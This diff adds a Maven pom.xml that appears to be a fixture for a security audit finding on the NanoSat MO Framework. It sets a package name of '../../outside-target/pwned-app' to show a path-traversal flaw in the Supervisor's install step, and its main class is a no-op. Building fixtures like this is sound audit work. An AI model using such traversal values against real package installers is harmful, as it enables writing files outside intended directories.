@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+  <modelVersion>4.0.0</modelVersion>
+
+  <!--
+    Finding 2 fixture: a .nmfpack whose package-metadata.properties declares
+    info.name=../../outside-target/pwned-app, built via
+    generate-nmf-package's name override (defaults to project.artifactId,
+    which cannot itself contain '/'), so this pom's own artifactId is an
+    unrelated, valid Maven identifier; only the generated metadata's
+    info.name is the attacker-controlled traversal string. See
+    findings/02-path-traversal-install/README.md.
+
+    Side effect: the plugin's own output path is name plus version plus
+    ".nmfpack" under target/, so with a '../'-laden name the built file
+    itself lands outside this module's target/ directory too. That is a
+    quirk of the build tool, not part of the vulnerability being
+    demonstrated (which is entirely about the Supervisor's install(), not
+    about how the package was built). Find the resulting file with `find`
+    after building rather than assuming it's in target/.
+  -->
+
+  <parent>
+    <groupId>int.esa.nmf</groupId>
+    <artifactId>nanosat-mo-framework</artifactId>
+    <version>5.1-SNAPSHOT</version>
+    <relativePath/>
+  </parent>
+
+  <groupId>esa.mo.nmf.bench</groupId>
+  <artifactId>pwned-package-fixture</artifactId>
+  <version>1.0.0</version>
+  <packaging>jar</packaging>
+
+  <properties>
+    <maven.compiler.source>11</maven.compiler.source>
+    <maven.compiler.target>11</maven.compiler.target>
+    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
+    <assembly.mainClass>esa.mo.nmf.apps.pwned.NoopApp</assembly.mainClass>
+  </properties>
+
+  <build>
+    <plugins>
+      <plugin>
+        <groupId>int.esa.nmf.core</groupId>
+        <artifactId>nmf-package-maven-plugin</artifactId>
+        <executions>
+          <execution>
+            <phase>package</phase>
+            <goals>
+              <goal>generate-nmf-package</goal>
+            </goals>
+            <configuration>
+              <name>../../outside-target/pwned-app</name>
+              <mainClass>${assembly.mainClass}</mainClass>
+            </configuration>
+          </execution>
+        </executions>
+      </plugin>
+    </plugins>
+  </build>
+</project>
